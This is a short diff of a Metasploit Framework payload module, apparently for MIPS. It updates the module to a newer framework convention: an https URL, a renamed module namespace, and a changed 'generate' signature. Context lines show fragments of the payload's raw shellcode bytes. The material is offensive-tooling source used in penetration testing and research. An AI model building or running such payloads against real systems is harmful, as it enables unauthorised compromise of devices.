@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-module Metasploit3
+module MetasploitModule
 
   CachedSize = 32
 
@@ -40,7 +38,7 @@ module Metasploit3
     )
   end
 
-  def generate
+  def generate(_opts = {})
     shellcode =
       "\x3c\x06\x43\x21" +  #lui     a2,0x4321
       "\x34\xc6\xfe\xdc" +  #ori     a2,a2,0xfedc
@@ -53,5 +51,4 @@ module Metasploit3
 
     return super + shellcode
   end
-
 end
